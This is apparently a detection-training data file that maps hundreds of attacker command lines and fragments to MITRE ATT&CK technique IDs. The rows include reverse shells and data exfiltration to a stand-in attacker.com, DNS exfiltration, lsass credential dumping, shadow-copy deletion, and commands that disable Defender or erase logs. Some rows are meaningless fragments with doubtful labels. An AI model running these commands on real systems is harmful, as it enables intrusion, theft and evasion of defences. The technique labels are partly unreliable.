command,mitre_id
"echo ""*** Delivery channel deleted ***""",T1562
.pth,T1546
chflags,T1564
winupdate.exe,T1036
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f",T1112
GetKeyboardLayoutList,T1614
SRCheck,T1036
$newModule.CodeModule.AddFromString($vbaCode),T1137
GetKeyboardLayout,T1614
Restart-Computer,T1547
var FileReader = Java.type('java.io.FileReader');,T1005
HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString,T1012
user: x,T1059
GetProcessHeap,T1106
"Write-Output ""Download original function code failed.""",T1528
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp $optional_args",T1087
"powershell -Command ""Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }"" > NUL",T1489
/Library/LaunchDaemons/,T1543
cd $env:TEMP,T1562
wmiexec,T1047
code tunnel --name xxxxxx,T1105
MS17-10 -noninteractive -consoleoutput,T1046
"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Value ""$dllpath""",T1546
<LogonCommand>,T1564
touch $target_file_path,T1070
wget --post-data=DATA http://attacker.com,T1105
reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f,T1112
var host='attacker.com';,T1059
Update.exe --download {REMOTEURL},T1218
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe",T1547
rsync,T1105
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnce""",T1012
if ($entry.FullName.EndsWith('/')) { # directory entry,T1562
var fos = new FileOutputStream('/path/to/output-file');,T1105
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -sc dclist",T1018
/path/to/ld.so /bin/sh,T1059
"$which_python -c ""import tarfile; output_file = tarfile.open('$path_to_output_file','w'); output_file.add('$path_to_input_file'); output_file.close()""",T1560
psexec.exe,T1562
touch /var/tmp/T1564.001_mac.txt,T1564
wmic shadowcopy call create Volume=$drive_letter,T1003
"mavinject.exe $process_id /INJECTRUNNING ""$dll_payload""",T1218
TCP,T1205
"Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\$srserver_exe""",T1219
launchctl load -w /Library/LaunchAgents/$plist_filename,T1543
/proc/[pid]/maps,T1055
sfindr,T1083
/lib/udev/rules.d/,T1546
querymanifest.cgi,T1554
security find-certificate -a -p > $cert_export,T1555
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs,T1082
"Compress-Archive -Path ""$input_file"" -DestinationPath $output_file -Force",T1074
tshark -Xlua_script:/path/to/temp-file,T1548
service cbdaemon stop,T1562
tttracer.exe {PATH_ABSOLUTE:.exe},T1127
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\,T1547
"regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll""",T1564
Parameters,T1574
"Invoke-Seatbelt -Command ""-group=all""",T1082
logins.json,T1552
netsh wlan show profile * key=clear,T1016
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,T1218
KerberosRequestorSecurityToken.GetRequest,T1558
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force",T1484
text/plain,T1027
powershell.exe -EncodedCommand $EncodedCommand,T1027
WriteProcessMemory(),T1574
"Add-Content -Path $ads_file -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'",T1059
</volume>,T1222
netstat -ano,T1049
rc.common,T1037
HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\,T1547
/System/Library/LaunchAgents,T1543
tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt,T1119
directories of the user owned directories (,T1543
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1012
"wmic /node:<ip> process call create ""cmd /c copy c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst"" copy ""i:\<path>\<username>\My Documents\<filename>.pst""",T1114
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge",T1550
C-x C-s,T1222
curl -k $ip_lookup_url,T1614
"grep -i ""PASS"" ""$output_file""",T1003
~/Library,T1564
ProxyCommand,T1202
"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C x",T1059
sc query state= all,T1007
icacls.exe,T1222
SetWindowsHookEx,T1056
NT AUTHORITY\SYSTEM,T1134
} else{,T1531
/run/shm,T1027
"CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}",T1546
[ -f $HOME/.zshrc_aliases ] && . $HOME/.zshrc_aliases,T1546
python -c 'import sys; from os import environ as e,T1105
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",T1105
sc start VBoxDRV,T1564
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 1",T1562
[byte[]]$bytes = 0..65535|%{0};,T1573
$User.PasswordNotRequired = $False,T1136
mstsc.exe /v:{hostname/ip},T1021
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'),T1558
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f",T1543
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""",T1012
Actual: $ActualOutput,T1218
OpenEventLogW,T1070
echo y | $pscp_binary -P $scp_port -pw $scp_password $exfil_package $scp_user@$target_location:$target_filename,T1105
sudo $program_path -a -t 3,T1040
C:\Windows\System32\utilman.exe,T1546
mv /path/to/temp-file /path/to/output-file,T1222
"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*""",T1652
cacls.exe,T1222
mssync.exe,T1036
foreach($password in $passwords) {,T1110
public const int SE_PRIVILEGE_ENABLED = 0x00000002;,T1562
/etc/ssh/keys-<username>/authorized_keys,T1098
/sbin/auditd -n,T1036
dscl . list /Groups,T1087
dscacheutil -q group,T1087
C:\Windows,T1053
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist,T1562
gdb -nx -ex '!/bin/sh' -ex quit,T1059
"QueryLanguage=""WQL"";",T1546
pidstat -e /bin/sh,T1059
unlink /var/log/messages,T1070
"dscl . -create /Users/$username RealName ""$realname""",T1136
pluginpath=/path/to/temp-dir/,T1548
"function Invoke-dpsLight ($Password, $userlist) {",T1110
ren %APPDATA%\amsi.dll ualapi.dll,T1574
net user administrator /domain,T1087
/proc/<PID>/maps,T1003
net time \\ip/hostname,T1124
chmod -R $symbolic_mode $file_or_folder,T1222
NtWriteVirtualMemory,T1055
<format type='raw'/>,T1222
echo '# KEYWORD: shutdown' >> $rc_service_path/$rc_service_file,T1543
"[Reflection.Assembly]::LoadFile(\""%s\"")\n$i=\""\""\n$r=[%s]::%s(\""%s\"",[ref] $i)\necho $r,$i\n",T1059
"$storageAccountObjects | Export-Csv -Path ""$output_file"" -NoTypeInformation",T1619
"octave-cli --eval 'system(""/bin/sh"")'",T1059
"echo ""ExecStartPost=$execstartpost_action"" >> $systemd_service_path/$systemd_service_file",T1543
rpm -ivh x-1.0-1.noarch.rpm,T1059
pip install --break-system-packages .,T1548
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,T1012
/vmfs/volumes/,T1486
"{cmd /c copy ""$binary_file"" ""\\$machine\$remote_drive_letter$$exe_remote_folder""",T1105
gcc -x c -E /path/to/input-file,T1005
wget,T1105
java.lang.Thread.sleep(50);,T1059
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",T1547
fmt -pNON_EXISTING_PREFIX /path/to/input-file,T1005
"if(-not $wdApp.path.contains(""Program Files (x86)""))",T1137
Connect-AzureAD -Credential $Credential 2>&1> $null,T1110
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,T1546
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",T1547
generaldomaininfo -noninteractive -consoleoutput,T1087
7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so,T1005
ImpersonateLoggedOnUser,T1134
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket,T1059
cat /etc/hosts,T1016
DelegateExecute,T1546
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\,T1074
"Add-MailboxPermission -Identity ""$delegate_target"" -User ""$operator_mailbox"" -AccessRights FullAccess -InheritanceType All",T1098
Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null,T1484
"Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"" -Destination ""C:\Windows\System32""",T1003
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337,T1539
"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",T1112
"), globing (",T1027
powerSQL -noninteractive -consoleoutput,T1518
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},T1490
"date ""$NOW""",T1070
/lib/preload.so reboot newreboot 1,T1574
Visio.exe {REMOTEURL},T1105
"(Get-EsxCli -VMHost $vm_host -V2).software.acceptance.set.Invoke(@{level = ""CommunitySupported""})",T1562
"), and socket activity (",T1562
sudo log erase --all,T1070
/Library/LaunchAgents,T1543
DebuggerIsAttached,T1622
nmap -Pn -sV -p $port_range $host,T1046
echo $ENCODED | b64decode -r,T1140
mips_ff,T1562
cat $output_file,T1003
type {PATH_ABSOLUTE} > {PATH_SMB},T1048
"copy ""$executable_binary"" ""\\?\C:\Windows \System32\mmc.exe""",T1548
"""Authentication Packages""=&lt;target binary&gt;",T1547
"Start-Process -Wait -FilePath ""$UltraViewer_Path"" -Argument ""/silent"" -PassThru",T1219
$Create.Save(),T1547
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file,T1059
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},T1105
GetLogicalDriveStrings,T1106
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\,T1546
"Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 0",T1562
HKLM:\SOFTWARE\Microsoft\Cryptography\MachineGuid,T1012
"windows\syswow64,",T1053
win.exe,T1036
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,T1216
wmic shadowcopy delete,T1490
dd if=/dev/random bs=1 count=1 >> $file_to_pad #adds high-quality random data,T1027
HKCU\Software\dnimtsoleht\StubPath,T1547
doas -u root /bin/sh,T1059
"dir ""%userprofile%\Desktop\*.*"" >> $output_file",T1083
GetSystemDirectoryW,T1106
kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,T1552
whiptail --textbox --scrolltext /path/to/input-file 0 0,T1005
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",T1003
esxcli system account list,T1087
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
C:\Windows\System32\winevt\Logs,T1070
aws logs delete-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,T1562
"set-itemproperty $RunOnceKey ""NextRun"" '$thing_to_execute ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'",T1547
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'),T1082
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null,T1204
"{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}",T1552
strings texput.dvi,T1005
0xFF 0xD8,T1036
su -c /bin/sh,T1059
"julia -e 'print(open(f->read(f, String), ""/path/to/input-file""))'",T1005
C:\Windows\System32\cmd.exe /c net view /all,T1135
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s $dll_name) ELSE ( $regsvr32path\$regsvr32name /s $dll_name )",T1218
Remove-ItemProperty -Path $registryPath -Name $newValueName,T1562
"sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select ""DATA"";'",T1222
Get-UnattendedInstallFile,T1552
swift $swift_src -keylog,T1056
net user $guest_user $guest_password,T1078
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f,T1112
"rundll32.exe {PATH},EntryPoint",T1218
"New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force",T1562
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},T1567
vi -c ':!/bin/sh' /dev/null,T1059
"foreach ($machine in get-content -path ""$machine_list"")",T1105
"Get-Process -Name ""EDR-Freeze_1.0"" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue",T1562
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""",T1547
Exec,T1547
HKCU\Software\Classes\http\shell\open\command,T1012
vba_macro.exe,T1059
Process32First,T1106
WinProj.exe {REMOTEURL},T1105
"Import-Module ""PathToAtomicsFolder\T1526\src\AWSDiscovery.ps1""",T1526
"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(</path/to/input-file)"" >&$REPLY'",T1105
cmd.exe /C quser,T1033
uuencode /path/to/input-file /dev/stdout | uudecode,T1005
Remove-EventLog -LogName Security,T1070
"Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME",T1098
ssh localhost /bin/sh,T1059
"Service Control Manager/7045;winupd,%SystemRoot%\winupd.exe,user mode service,demand start,LocalSystem",T1569
"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full",T1003
wget --post-file=/path/to/input-file http://attacker.com,T1105
/etc/zprofile,T1156
net.exe group /domain,T1069
taskhostsvc.exe,T1036
New-Item -ItemType Directory -Path $storageAccountOutputPath,T1530
Invoke-WebRequest -Uri $destination_url -Method POST -Body $filecontent -DisableKeepAlive,T1041
malware,T1564
sudo log -f /var/log/system.log | : > /var/log/system.log,T1070
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore",T1562
"{echo $machine >> ""$offline_list""}}",T1105
Set-PSReadLineOption -HistorySavePath {File Path},T1562
CreateFileA to \\.\PHYSICALDRIVE0,T1680
__fnDWORD,T1574
"var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){",T1059
"dig @$attacker_dns_server -p $dns_port $(echo ""$secret_info"" | base64).google.com",T1048
fail2ban-client stop x,T1059
"get-process | ?{$_.Description -like ""*cylance*""}",T1518
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1",T1562
shutdown -r $timeout,T1529
curl $test_url,T1090
pic /path/to/input-file,T1005
bcd.bat,T1059
systemd-daemon,T1036
certutil -encode {PATH} {PATH:.base64},T1027
Invoke-Obfuscation,T1027
msrun.bat,T1059
public class Test {,T1036
"net group ""Exchange Servers"" /domain",T1018
"sudo sed -i ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",T1556
fmt -999 /path/to/input-file,T1005
docker run --name t1069_container --rm -d -t t1069,T1069
"taskName = ""OpenCalcTask""",T1137
"sudo find /var/log -name '$system_log_name1*' -exec rm {} \; #using ""rm"" execution",T1070
"C:\Windows\System32\inetsrv\appcmd.exe set config ""$website_name"" /section:httplogging /dontLog:true",T1562
testcat /etc/passwd,T1003
{42aedc87-2188-41fd-b9a3-0c966feabec1},T1546
schtasks /query,T1053
tasklist.exe | findstr /i virus,T1518
taskkill -f -im msedge.exe,T1218
GetVolumePathNamesForVolumeNameW(),T1083
consent.exe,T1134
